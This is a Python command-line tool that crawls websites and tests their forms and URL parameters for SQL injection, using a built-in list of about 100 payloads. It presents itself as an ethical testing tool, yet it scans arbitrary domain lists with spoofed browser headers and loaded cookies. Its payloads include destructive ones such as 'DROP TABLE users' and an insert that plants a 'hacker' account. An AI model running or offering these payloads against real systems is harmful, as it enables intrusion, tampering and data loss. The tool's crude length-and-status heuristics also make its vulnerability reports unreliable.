#!/usr/bin/env python3
"""
SQL Injection Testing Tool
Author: Security Testing Tool
Purpose: Ethical penetration testing of owned infrastructure

Usage:
    python sqli_checker.py --domains domain_list.txt --payloads payloads.txt --output results.csv
    python sqli_checker.py --url https://example.com --payloads payloads.txt --output results.csv

Requirements:
    pip install requests beautifulsoup4 urllib3 threading
"""

import argparse
import csv
import json
import logging
import random
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from urllib.robotparser import RobotFileParser

import requests
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings only when verification is disabled
# requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SQLInjectionTester:
    def __init__(self, max_workers=10, max_depth=3, max_pages=100, 
                 cookies_file=None, delay_range=(1, 3), timeout=10, verify_ssl=True):
        """
        Initialize the SQL injection testing tool
        
        Args:
            max_workers (int): Number of concurrent threads
            max_depth (int): Maximum crawling depth
            max_pages (int): Maximum pages per domain
            cookies_file (str): Path to JSON file containing cookies
            delay_range (tuple): Range for random delays between requests
            timeout (int): Request timeout in seconds
            verify_ssl (bool): Enable SSL certificate verification (default: True)
        """
        self.max_workers = max_workers
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.delay_range = delay_range
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.visited_urls = set()
        self.tested_params = set()
        self.lock = threading.Lock()
        
        # Setup session
        self.session.verify = verify_ssl
        if not verify_ssl:
            logging.warning("⚠️  SSL certificate verification is DISABLED. Use --verify-ssl for secure connections.")
            # Disable SSL warnings only if verification is disabled
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Load cookies if provided
        if cookies_file and Path(cookies_file).exists():
            self.load_cookies(cookies_file)
        
        # SQL injection payloads
        self.payloads = []
        self.default_payloads = [
            # Basic SQL injection payloads
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR '1'='1' --",
            '" OR "1"="1" --',
            "' OR '1'='1' /*",
            '" OR "1"="1" /*',
            "' OR 1=1--",
            '" OR 1=1--',
            "' OR 1=1 --",
            '" OR 1=1 --',
            "' OR 1=1/*",
            '" OR 1=1/*',
            "' OR 'x'='x",
            '" OR "x"="x',
            "') OR ('1'='1",
            '") OR ("1"="1',
            "') OR ('1'='1' --",
            '") OR ("1"="1" --',
            
            # UNION-based payloads
            "' UNION SELECT NULL--",
            '" UNION SELECT NULL--',
            "' UNION SELECT NULL,NULL--",
            '" UNION SELECT NULL,NULL--',
            "' UNION SELECT NULL,NULL,NULL--",
            '" UNION SELECT NULL,NULL,NULL--',
            "' UNION SELECT 1,2,3--",
            '" UNION SELECT 1,2,3--',
            "' UNION ALL SELECT NULL--",
            '" UNION ALL SELECT NULL--',
            
            # Time-based blind SQL injection
            "' AND SLEEP(5)--",
            '" AND SLEEP(5)--',
            "' OR SLEEP(5)--",
            '" OR SLEEP(5)--',
            "'; WAITFOR DELAY '00:00:05'--",
            '"; WAITFOR DELAY \'00:00:05\'--',
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            '" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--',
            "' AND pg_sleep(5)--",
            '" AND pg_sleep(5)--',
            "' AND BENCHMARK(1000000,MD5(1))--",
            '" AND BENCHMARK(1000000,MD5(1))--',
            
            # Boolean-based blind SQL injection
            "' AND 1=1--",
            '" AND 1=1--',
            "' AND 1=2--",
            '" AND 1=2--',
            "' AND 'a'='a",
            '" AND "a"="a',
            "' AND 'a'='b",
            '" AND "a"="b',
            "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64--",
            '" AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64--',
            
            # Error-based SQL injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))--",
            '" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))--',
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)--",
            '" AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)--',
            
            # Second-order SQL injection
            "admin'/*",
            'admin"/*',
            "admin'||'",
            'admin"||"',
            
            # SQL injection with encoding
            "%27",  # '
            "%22",  # "
            "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1
            "%22%20OR%20%221%22%3D%221",  # " OR "1"="1
            
            # NoSQL injection (for completeness)
            "' || '1'=='1",
            '" || "1"=="1',
            "' && '1'=='1",
            '" && "1"=="1',
            
            # Stack-based SQL injection
            "'; DROP TABLE users--",
            '"; DROP TABLE users--',
            "'; INSERT INTO users VALUES('hacker','password')--",
            '"; INSERT INTO users VALUES(\'hacker\',\'password\')--',
            
            # Bypass filters
            "' /*!OR*/ '1'='1",
            '" /*!OR*/ "1"="1',
            "' %0aOR%0a '1'='1",
            '" %0aOR%0a "1"="1',
            "' or''='",
            '" or""="',
            "' or 1=1 or ''='",
            '" or 1=1 or ""="',
            
            # Database-specific payloads
            # MySQL
            "' AND @@version>0--",
            '" AND @@version>0--',
            "' UNION SELECT @@version--",
            '" UNION SELECT @@version--',
            
            # PostgreSQL
            "' AND current_database()>''--",
            '" AND current_database()>\'\'--',
            "' UNION SELECT version()--",
            '" UNION SELECT version()--',
            
            # Oracle
            "' AND ROWNUM=1--",
            '" AND ROWNUM=1--',
            "' UNION SELECT banner FROM v$version--",
            '" UNION SELECT banner FROM v$version--',
            
            # SQLite
            "' AND sqlite_version()>''--",
            '" AND sqlite_version()>\'\'--',
            "' UNION SELECT sqlite_version()--",
            '" UNION SELECT sqlite_version()--',
            
            # Microsoft SQL Server
            "' AND @@SERVERNAME>''--",
            '" AND @@SERVERNAME>\'\'--',
            "' UNION SELECT @@version--",
            '" UNION SELECT @@version--',
        ]
        
        # Error patterns that indicate SQL injection
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySQLSyntaxErrorException",
            r"SQLException",
            r"sqlite3.OperationalError",
            r"SQLite.*database",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"ORA-[0-9][0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Incorrect syntax near",
            r"Unclosed quotation mark after the character string",
            r"Microsoft JET Database Engine",
            r"ODBC Microsoft Access Driver",
            r"ADODB.Field error",
            r"Exception (Microsoft.|ADODB.|mysql_|oci|ora|pg_)",
            r"does not exist.*supplied argument.*resource",
            r"Unknown column.*in.*field list",
            r"Table.*doesn.*t exist",
            r"Division by zero in.*on line",
            r"function.*expects parameter",
            r"You have an error in your SQL syntax"
        ]
        
        # Time-based detection patterns
        self.time_based_delay = 5  # seconds
        
    def load_cookies(self, cookies_file):
        """Load cookies from JSON file (Cookie Editor format)"""
        try:
            with open(cookies_file, 'r') as f:
                cookies_data = json.load(f)
                
            # Handle Cookie Editor format
            if isinstance(cookies_data, list):
                for cookie in cookies_data:
                    if 'name' in cookie and 'value' in cookie:
                        self.session.cookies.set(cookie['name'], cookie['value'])
            else:
                # Handle simple key-value format
                for name, value in cookies_data.items():
                    self.session.cookies.set(name, str(value))
                    
            logging.info(f"Loaded {len(self.session.cookies)} cookies from {cookies_file}")
        except Exception as e:
            logging.warning(f"Failed to load cookies from {cookies_file}: {e}")
    
    def load_payloads(self, payloads_file=None):
        """Load SQL injection payloads from file or use defaults"""
        if payloads_file and Path(payloads_file).exists():
            try:
                with open(payloads_file, 'r', encoding='utf-8') as f:
                    self.payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                logging.info(f"Loaded {len(self.payloads)} payloads from {payloads_file}")
            except Exception as e:
                logging.error(f"Failed to load payloads from {payloads_file}: {e}")
                logging.info("Using default payloads instead")
                self.payloads = self.default_payloads
        else:
            if payloads_file:
                logging.warning(f"Payload file {payloads_file} not found. Using default payloads.")
            else:
                logging.info("No payload file specified. Using default payloads.")
            self.payloads = self.default_payloads
            
        logging.info(f"Total payloads loaded: {len(self.payloads)}")
    
    def get_robots_txt(self, base_url):
        """Check robots.txt for crawl restrictions"""
        try:
            robots_url = urljoin(base_url, '/robots.txt')
            response = self.session.get(robots_url, timeout=self.timeout)
            if response.status_code == 200:
                return response.text
        except Exception as e:
            logging.debug(f"Could not fetch robots.txt for {base_url}: {e}")
        return None
    
    def is_allowed_by_robots(self, url, robots_content):
        """Check if URL is allowed by robots.txt"""
        if not robots_content:
            return True
        
        try:
            rp = RobotFileParser()
            rp.read_string(robots_content)
            return rp.can_fetch('*', url)
        except:
            return True
    
    def normalize_url(self, url):
        """Normalize URL by removing fragments and sorting query parameters"""
        parsed = urlparse(url)
        if parsed.query:
            # Sort query parameters for consistent comparison
            params = parse_qs(parsed.query, keep_blank_values=True)
            sorted_query = urlencode(sorted(params.items()), doseq=True)
            normalized = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, sorted_query, ''
            ))
        else:
            normalized = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, '', ''
            ))
        return normalized
    
    def extract_forms(self, soup, base_url):
        """Extract forms from HTML"""
        forms = []
        for form in soup.find_all('form'):
            form_data = {
                'action': urljoin(base_url, form.get('action', '')),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            
            # Extract input fields
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                if input_tag.name == 'input':
                    input_type = input_tag.get('type', 'text').lower()
                    if input_type not in ['submit', 'button', 'reset', 'file', 'image']:
                        form_data['inputs'].append({
                            'name': input_tag.get('name', ''),
                            'type': input_type,
                            'value': input_tag.get('value', '')
                        })
                elif input_tag.name in ['textarea', 'select']:
                    form_data['inputs'].append({
                        'name': input_tag.get('name', ''),
                        'type': input_tag.name,
                        'value': input_tag.get('value', '')
                    })
            
            if form_data['inputs']:
                forms.append(form_data)
        
        return forms
    
    def extract_links(self, soup, base_url):
        """Extract links from HTML with query parameters"""
        links = set()
        
        # Extract links with query parameters
        for link in soup.find_all('a', href=True):
            url = urljoin(base_url, link['href'])
            parsed = urlparse(url)
            if parsed.query and parsed.netloc == urlparse(base_url).netloc:
                links.add(url)
        
        return links
    
    def crawl_website(self, base_url, max_depth=3):
        """Crawl website to find URLs and forms"""
        urls_to_crawl = [(base_url, 0)]
        crawled_urls = set()
        found_targets = []
        
        # Get robots.txt
        robots_content = self.get_robots_txt(base_url)
        
        while urls_to_crawl and len(crawled_urls) < self.max_pages:
            current_url, depth = urls_to_crawl.pop(0)
            
            if depth > max_depth or current_url in crawled_urls:
                continue
            
            # Check robots.txt
            if not self.is_allowed_by_robots(current_url, robots_content):
                logging.debug(f"Skipping {current_url} (blocked by robots.txt)")
                continue
            
            try:
                logging.info(f"Crawling: {current_url} (depth: {depth})")
                response = self.session.get(current_url, timeout=self.timeout)
                
                if response.status_code == 200:
                    crawled_urls.add(current_url)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract forms
                    forms = self.extract_forms(soup, current_url)
                    for form in forms:
                        found_targets.append(('form', form))
                    
                    # Extract URLs with parameters
                    if depth < max_depth:
                        links = self.extract_links(soup, current_url)
                        for link in links:
                            if link not in crawled_urls:
                                parsed = urlparse(link)
                                if parsed.query:  # Only add URLs with parameters
                                    found_targets.append(('url', link))
                                urls_to_crawl.append((link, depth + 1))
                
                # Random delay
                time.sleep(random.uniform(*self.delay_range))
                
            except Exception as e:
                logging.warning(f"Error crawling {current_url}: {e}")
                continue
        
        logging.info(f"Found {len(found_targets)} potential test targets")
        return found_targets
    
    def detect_sql_injection(self, response_normal, response_payload, payload, execution_time):
        """Detect SQL injection based on response differences"""
        
        # Error-based detection
        for pattern in self.error_patterns:
            if re.search(pattern, response_payload.text, re.IGNORECASE):
                return True, "Error-based SQL injection detected"
        
        # Time-based detection
        if execution_time > self.time_based_delay * 0.8:  # 80% of expected delay
            return True, "Time-based SQL injection detected"
        
        # Content-based detection
        if len(response_payload.text) != len(response_normal.text):
            # Significant content difference
            diff_ratio = abs(len(response_payload.text) - len(response_normal.text)) / len(response_normal.text)
            if diff_ratio > 0.1:  # 10% difference
                return True, "Content-based SQL injection detected"
        
        # Status code differences
        if response_normal.status_code != response_payload.status_code:
            return True, "Status code difference detected"
        
        return False, "No SQL injection detected"
    
    def test_url_parameter(self, url, param_name, payload):
        """Test a specific URL parameter for SQL injection"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            # Get normal response
            response_normal = self.session.get(url, timeout=self.timeout)
            
            # Test with payload
            original_value = params.get(param_name, [''])[0]
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                 parsed.params, new_query, parsed.fragment))
            
            start_time = time.time()
            response_payload = self.session.get(test_url, timeout=self.timeout)
            execution_time = time.time() - start_time
            
            # Detect SQL injection
            is_vulnerable, detection_method = self.detect_sql_injection(
                response_normal, response_payload, payload, execution_time
            )
            
            return {
                'url': url,
                'parameter': param_name,
                'payload': payload,
                'vulnerable': is_vulnerable,
                'detection_method': detection_method,
                'status_code': response_payload.status_code,
                'response_time': execution_time
            }
            
        except Exception as e:
            logging.error(f"Error testing URL parameter {param_name} in {url}: {e}")
            return {
                'url': url,
                'parameter': param_name,
                'payload': payload,
                'vulnerable': False,
                'detection_method': f"Error: {str(e)}",
                'status_code': None,
                'response_time': None
            }
    
    def test_form_parameter(self, form, input_name, payload):
        """Test a form parameter for SQL injection"""
        try:
            # Prepare form data
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name']:
                    if input_field['name'] == input_name:
                        form_data[input_field['name']] = payload
                    else:
                        form_data[input_field['name']] = input_field.get('value', 'test')
            
            # Get normal response
            if form['method'] == 'GET':
                response_normal = self.session.get(form['action'], params=form_data, timeout=self.timeout)
            else:
                response_normal = self.session.post(form['action'], data=form_data, timeout=self.timeout)
            
            # Test with payload
            form_data[input_name] = payload
            
            start_time = time.time()
            if form['method'] == 'GET':
                response_payload = self.session.get(form['action'], params=form_data, timeout=self.timeout)
            else:
                response_payload = self.session.post(form['action'], data=form_data, timeout=self.timeout)
            execution_time = time.time() - start_time
            
            # Detect SQL injection
            is_vulnerable, detection_method = self.detect_sql_injection(
                response_normal, response_payload, payload, execution_time
            )
            
            return {
                'url': form['action'],
                'parameter': input_name,
                'payload': payload,
                'vulnerable': is_vulnerable,
                'detection_method': detection_method,
                'status_code': response_payload.status_code,
                'response_time': execution_time
            }
            
        except Exception as e:
            logging.error(f"Error testing form parameter {input_name} in {form['action']}: {e}")
            return {
                'url': form['action'],
                'parameter': input_name,
                'payload': payload,
                'vulnerable': False,
                'detection_method': f"Error: {str(e)}",
                'status_code': None,
                'response_time': None
            }
    
    def test_target(self, target_type, target, payload):
        """Test a target (URL or form) with a payload"""
        time.sleep(random.uniform(*self.delay_range))
        
        if target_type == 'url':
            # Test URL parameters
            parsed = urlparse(target)
            params = parse_qs(parsed.query, keep_blank_values=True)
            results = []
            
            for param_name in params.keys():
                result = self.test_url_parameter(target, param_name, payload)
                results.append(result)
            
            return results
        
        elif target_type == 'form':
            # Test form parameters
            results = []
            for input_field in target['inputs']:
                if input_field['name']:
                    result = self.test_form_parameter(target, input_field['name'], payload)
                    results.append(result)
            
            return results
        
        return []
    
    def test_website(self, base_url, output_file):
        """Test a website for SQL injection vulnerabilities"""
        logging.info(f"Starting SQL injection test for: {base_url}")
        
        # Normalize URL
        if not base_url.startswith(('http://', 'https://')):
            # Try HTTPS first
            https_url = f"https://{base_url}"
            try:
                response = self.session.get(https_url, timeout=self.timeout)
                base_url = https_url
                logging.info(f"Using HTTPS: {base_url}")
            except:
                # Fallback to HTTP
                base_url = f"http://{base_url}"
                logging.info(f"HTTPS failed, using HTTP: {base_url}")
        
        # Crawl website
        targets = self.crawl_website(base_url, self.max_depth)
        
        if not targets:
            logging.warning(f"No testable targets found for {base_url}")
            return []
        
        # Test all combinations of targets and payloads
        all_results = []
        total_tests = sum(len(self.payloads) for _, target in targets 
                         if isinstance(target, dict) and 'inputs' in target 
                         for _ in target['inputs'] if _['name']) + \
                      sum(len(self.payloads) * len(parse_qs(urlparse(target).query)) 
                         for target_type, target in targets if target_type == 'url')
        
        logging.info(f"Starting {total_tests} SQL injection tests...")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for target_type, target in targets:
                for payload in self.payloads:
                    future = executor.submit(self.test_target, target_type, target, payload)
                    futures.append(future)
            
            # Collect results
            for future in as_completed(futures):
                try:
                    results = future.result()
                    all_results.extend(results)
                except Exception as e:
                    logging.error(f"Error in test execution: {e}")
        
        logging.info(f"Completed testing {base_url}. Found {sum(1 for r in all_results if r['vulnerable'])} vulnerabilities")
        return all_results
    
    def save_results(self, results, output_file):
        """Save results to CSV file"""
        with open(output_file, 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['url', 'parameter', 'payload', 'vulnerable', 'detection_method', 
                         'status_code', 'response_time']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            writer.writeheader()
            for result in results:
                writer.writerow(result)
        
        logging.info(f"Results saved to {output_file}")

def setup_logging(log_file=None, verbose=False):
    """Setup logging configuration"""
    log_level = logging.DEBUG if verbose else logging.INFO
    
    # Create formatter
    formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    # Setup console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    
    # Setup file handler if specified
    handlers = [console_handler]
    if log_file:
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(formatter)
        handlers.append(file_handler)
    
    # Configure logging
    logging.basicConfig(
        level=log_level,
        handlers=handlers,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Testing Tool - For ethical security testing only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sqli_checker.py --url https://example.com --output results.csv
  python sqli_checker.py --url https://example.com --payloads payloads.txt --output results.csv
  python sqli_checker.py --domains domains.txt --output results.csv --workers 5
  python sqli_checker.py --url example.com --payloads payloads.txt --output results.csv --cookies cookies.json
  python sqli_checker.py --url https://test-site.local --output results.csv --no-verify-ssl  # For testing only
        """
    )
    
    # Input options
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument('--url', help='Single URL to test')
    input_group.add_argument('--domains', help='File containing list of domains to test')
    
    # Required arguments
    parser.add_argument('--payloads', help='File containing SQL injection payloads (uses default if not specified)')
    parser.add_argument('--output', required=True, help='Output CSV file for results')
    
    # Optional arguments
    parser.add_argument('--cookies', help='JSON file containing cookies (Cookie Editor format)')
    parser.add_argument('--workers', type=int, default=10, help='Number of concurrent workers (default: 10)')
    parser.add_argument('--depth', type=int, default=3, help='Maximum crawl depth (default: 3)')
    parser.add_argument('--max-pages', type=int, default=100, help='Maximum pages per domain (default: 100)')
    parser.add_argument('--delay', type=float, nargs=2, default=[1, 3], help='Delay range between requests (default: 1-3 seconds)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--no-verify-ssl', action='store_true', help='Disable SSL certificate verification (NOT recommended for production)')
    parser.add_argument('--log', help='Log file path')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(args.log, args.verbose)
    
    # Validate files
    if args.payloads and not Path(args.payloads).exists():
        logging.error(f"Payloads file not found: {args.payloads}")
        sys.exit(1)
    
    if args.domains and not Path(args.domains).exists():
        logging.error(f"Domains file not found: {args.domains}")
        sys.exit(1)
    
    if args.cookies and not Path(args.cookies).exists():
        logging.error(f"Cookies file not found: {args.cookies}")
        sys.exit(1)
    
    # Initialize tester
    tester = SQLInjectionTester(
        max_workers=args.workers,
        max_depth=args.depth,
        max_pages=args.max_pages,
        cookies_file=args.cookies,
        delay_range=tuple(args.delay),
        timeout=args.timeout,
        verify_ssl=not args.no_verify_ssl  # Invert the flag
    )
    
    # Load payloads
    tester.load_payloads(args.payloads)
    
    # Get URLs to test
    urls = []
    if args.url:
        urls = [args.url]
    else:
        with open(args.domains, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    # Test all URLs
    all_results = []
    for url in urls:
        try:
            results = tester.test_website(url, args.output)
            all_results.extend(results)
        except KeyboardInterrupt:
            logging.info("Testing interrupted by user")
            break
        except Exception as e:
            logging.error(f"Error testing {url}: {e}")
            continue
    
    # Save results
    if all_results:
        tester.save_results(all_results, args.output)
        
        # Print summary
        total_tests = len(all_results)
        vulnerabilities = sum(1 for r in all_results if r['vulnerable'])
        
        print(f"\n{'='*50}")
        print(f"SQL INJECTION TEST SUMMARY")
        print(f"{'='*50}")
        print(f"Total tests performed: {total_tests}")
        print(f"Vulnerabilities found: {vulnerabilities}")
        print(f"Success rate: {(vulnerabilities/total_tests)*100:.1f}%" if total_tests > 0 else "No tests performed")
        print(f"Results saved to: {args.output}")
        
        if vulnerabilities > 0:
            print(f"\nVulnerable endpoints:")
            for result in all_results:
                if result['vulnerable']:
                    print(f"  - {result['url']} (parameter: {result['parameter']})")
    else:
        logging.warning("No results to save")

if __name__ == "__main__":
    main()